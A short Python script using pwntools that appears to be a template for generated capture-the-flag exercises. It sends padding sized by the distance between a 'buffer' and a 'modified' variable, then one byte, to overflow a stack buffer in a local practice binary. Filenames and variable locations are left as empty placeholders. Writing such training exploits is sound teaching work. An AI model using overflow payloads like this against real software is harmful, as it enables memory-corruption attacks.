from pwn import *

from elftools.dwarf.dwarf_expr import DWARFExprParser

gen_filename = ""
gen_names = {}
gen_var_locations = {}

e = ELF(gen_filename)
p = e.process()

buff = gen_names["buffer"]
mod = gen_names["modified"]

payload = b''
payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b'a'
payload += b'b'
p.sendline(payload)

p.stream()

